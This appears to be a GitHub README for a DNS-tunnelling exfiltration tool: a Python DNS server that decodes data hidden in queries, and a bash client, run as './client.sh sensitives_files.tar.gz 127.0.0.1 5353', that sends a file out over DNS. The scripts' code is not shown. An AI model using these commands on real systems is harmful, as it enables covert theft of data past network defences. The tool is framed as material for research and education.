# Malicious DNS Server & Data Exfiltration Client

This project consists of a malicious DNS server and a client for data exfiltration via DNS queries.

[Screencast from 2025-04-01 10-34-54.webm](https://github.com/user-attachments/assets/05056cd3-59a3-4704-8b57-c999e16b8545)

## Features
- **DNS Server**: Intercepts and processes specially crafted DNS requests, python file.
- **Data Exfiltration**: Encodes and extracts data using DNS queries, bash file. Uses `dig` or `host` if available.

## Requirements
- Python 3.x
- Required libraries: `dnslib`

Install dependencies using:
```sh
pip install dnslib
```

## Usage
### Start the Malicious DNS Server
```sh
python3 malicious_dns_server.py
```

The server will listen for incoming DNS queries and extract encoded data.

### Use the Client for Data Exfiltration
```sh
./client.sh <file_to_exfiltrate> <dns_ip> <dns_port>
```
Example:
```sh
./client.sh sensitives_files.tar.gz 127.0.0.1 5353
```
This will encode and send the data using DNS queries to the malicious server.

## Security Warning ⚠️
This tool is for educational and research purposes only. Unauthorized use is illegal and unethical. Do not use this tool in real-world attacks.

## License
This project is licensed under the MIT License.

